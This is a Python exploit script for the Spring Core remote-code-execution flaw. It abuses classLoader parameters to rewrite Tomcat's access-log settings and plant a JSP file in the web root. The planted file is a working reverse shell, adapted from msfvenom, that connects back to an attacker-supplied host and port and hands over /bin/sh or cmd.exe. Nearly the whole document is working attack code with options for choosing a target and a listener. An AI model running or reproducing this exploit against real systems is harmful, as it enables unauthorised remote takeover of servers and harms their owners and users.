# Author: @cxzero
# Based on the original work of p1n93r and @Rezn0k

import requests
import argparse
from urllib.parse import urlparse, quote
import time

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

get_headers = {
    "prefix": "<%",
    "suffix": "%>"
}

def run_exploit(url, directory, filename, proxy, lhost, lport):

    proxies = {
        "http" : proxy,
        "https" : proxy
    }

    # Payload based on msfvenom java/jsp_shell_reverse_tcp
    log_pattern = """
        %{prefix}i@page import="java.lang.*"%{suffix}i
        %{prefix}i@page import="java.util.*"%{suffix}i
        %{prefix}i@page import="java.io.*"%{suffix}i
        %{prefix}i@page import="java.net.*"%{suffix}i

        %{prefix}i
          class StreamConnector extends Thread
          {
            InputStream vm;
            OutputStream jr;

            StreamConnector( InputStream vm, OutputStream jr )
            {
              this.vm = vm;
              this.jr = jr;
            }

            public void run()
            {
              BufferedReader ag  = null;
              BufferedWriter ffv = null;
              try
              {
                ag  = new BufferedReader( new InputStreamReader( this.vm ) );
                ffv = new BufferedWriter( new OutputStreamWriter( this.jr ) );
                char buffer[] = new char[8192];
                int length;
                while( ( length = ag.read( buffer, 0, buffer.length ) ) > 0 )
                {
                  ffv.write( buffer, 0, length );
                  ffv.flush();
                }
              } catch( Exception e ){}
              try
              {
                if( ag != null )
                  ag.close();
                if( ffv != null )
                  ffv.close();
              } catch( Exception e ){}
            }
          }

          try
          {
            String ShellPath;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
          ShellPath = new String("/bin/sh");
        } else {
          ShellPath = new String("cmd.exe");
        }
            Socket socket = new Socket( "{LHOST}", {LPORT} );
            Process process = Runtime.getRuntime().exec( ShellPath );
            ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
            ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
          } catch( Exception e ) {}
        %{suffix}i<!--//
    """

    log_pattern = log_pattern.replace("{LHOST}", lhost).replace("{LPORT}", lport)

    params = {
        'class.module.classLoader.resources.context.parent.pipeline.first.pattern' : log_pattern,
        'class.module.classLoader.resources.context.parent.pipeline.first.suffix' : '.jsp',
        'class.module.classLoader.resources.context.parent.pipeline.first.directory' : directory,
        'class.module.classLoader.resources.context.parent.pipeline.first.prefix' : filename,
        'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat' : ''
    }

    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.get(url, headers=get_headers, params=params, verify=False, proxies=proxies)
    print("[*] Response code: %d" % ret.status_code)


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url',help='target url', required=True)
    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="shell")
    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app', required=False, default="webapps/ROOT")
    parser.add_argument('--proxy', help='The proxy useful for HTTP message inspection (Default: None)', required=False, default=None)
    parser.add_argument('--lhost',help='local ip listening for reverse shell', required=True)
    parser.add_argument('--lport',help='local port listening for reverse shell', required=True)

    file_arg = parser.parse_args().file
    dir_arg = parser.parse_args().dir
    url_arg = parser.parse_args().url
    proxy_arg = parser.parse_args().proxy
    lhost = parser.parse_args().lhost
    lport = parser.parse_args().lport

    filename = file_arg.replace(".jsp", "")

    if url_arg is None:
        print("Must pass an option for --url")
        return

    try:
        run_exploit(url_arg, dir_arg, filename, proxy_arg, lhost, lport)
        print("[+] Exploit completed")
        print("[+] Check your target for a shell")
        print("[+] File: " + filename + ".jsp")

        if dir_arg:
            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
        else:
            location = f"Unknown. Custom directory used. (try app/{filename}.jsp"
        print(f"[+] Reverse shell should be at: {location}")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
